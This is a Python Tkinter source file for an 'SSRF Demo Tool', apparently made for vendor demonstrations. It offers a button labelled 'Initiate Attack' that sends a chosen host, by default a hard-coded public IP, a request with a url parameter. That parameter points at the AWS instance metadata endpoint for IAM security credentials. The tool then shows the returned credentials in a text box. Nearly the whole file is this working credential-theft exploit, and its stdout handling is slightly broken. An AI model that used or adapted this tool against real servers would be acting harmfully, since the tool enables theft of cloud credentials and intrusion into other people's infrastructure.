#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
+---------------------------------------------------------------------
+ Simple GUI interface to present set of target URL options, open URL
+ and display results in a textbox. Requires Python 3
+---------------------------------------------------------------------
'''

__author__ = 'Michael E. OConnor'

import sys
from tkinter import *
from tkinter import ttk

if sys.version_info <= (3, 0):
    print("Sorry, {} requires Python 3.x, detected version: {}".format \
          (sys.argv[0], str(sys.version_info[0]) + '.' + str(sys.version_info[1])))
    raise SystemExit()
else:
    from urllib.request import urlopen

# Construct GUI

class SSRF_Gui:

    def __init__(self, master):
        global result_box

        master.title('Lacework SSRF Demo Tool')
        frame0 = ttk.Panedwindow(master, orient=HORIZONTAL)
        frame0.pack(fill=BOTH, expand=True)
        frame1 = ttk.Frame(frame0, width=100, height=300, relief=SUNKEN)
        frame2 = ttk.Frame(frame0, width=500, height=300, relief=SUNKEN)
        frame0.add(frame1, weight=1)
        frame0.add(frame2, weight=4)

        # Populate subframe with list of target hosts radio buttons

        Label(frame1, text="Target Host", bg="blue", fg="white", justify=LEFT).pack(fill=X)
        self.host = StringVar()
        ttk.Radiobutton(frame1, text="Host 1", variable=self.host,
                                value="http://18.217.251.63:4567").pack(anchor='w')
        ttk.Radiobutton(frame1, text="Host 2", variable=self.host,
                                value="http://ipinfo.io").pack(anchor='w')
        ttk.Radiobutton(frame1, text="Host 3", variable=self.host,
                                value="http://lacework.com").pack(anchor='w')
        self.host.set("http://18.217.251.63:4567")                 # Set Default

        # Populate subframe with a list of URL payloads to append

        Label(frame1, text="URL Payload", bg="blue", fg="white", justify=LEFT).pack(fill=X)
        self.url=StringVar()
        ttk.Radiobutton(frame1, text="Security Credentials", variable=self.url,
                                value="http://169.254.169.254/latest/meta-data/iam/security-credentials/ssm-access").pack(anchor='w')
        ttk.Radiobutton(frame1, text="Option 2", variable=self.url,
                                value="XXX").pack(anchor='w')
        ttk.Radiobutton(frame1, text="Option 3", variable=self.url,
                                value="YYY").pack(anchor='w')
        self.url.set("http://169.254.169.254/latest/meta-data/iam/security-credentials/ssm-access")

        # Add a button to Open URL

        result_button = ttk.Button(frame1)
        result_button.config(text="Initiate Attack", command=self.submit)
        result_button.pack(anchor='s')

        # Create text box to hold results and add scrollbar on the right

        result_box = Text(frame2, width=90, height=20)
        scrollbar = Scrollbar(frame2, orient=VERTICAL, command=result_box.yview)
        scrollbar.pack(side=RIGHT, fill=Y)
        result_box["yscrollcommand"] = scrollbar.set
        result_box.pack(side=LEFT, fill=BOTH, expand=YES)

    def submit(self):

        self.clear()

        target_host = self.host.get() + "?url=" + self.url.get()

        # Open the URL and read the data

        try:
            webUrl = urlopen (target_host)
        except:
            print("Fatal error opening: {}".format(target_host))
            raise SystemExit()
        else:
            if (webUrl.getcode() == 200):
                data = webUrl.read()
                sys.stdout.write = redirector
                print("Calling: {}".format(target_host))    # Comment out!!!
                print(data.decode('utf-8'))
                sys.stdout.write = sys.__stdout__
            else:
                print("Can't retrieve requested data " + str(webUrl.getcode()))

    def clear(self):

        result_box.delete(1.0, 'end')

# Define stdout redirector so print output goes to GUI textbox

def redirector(inputStr):
    result_box.insert(INSERT, inputStr)


def main():

    root = Tk()
    SSRF_Gui(root)
    root.mainloop()


if __name__ == "__main__":
    main()
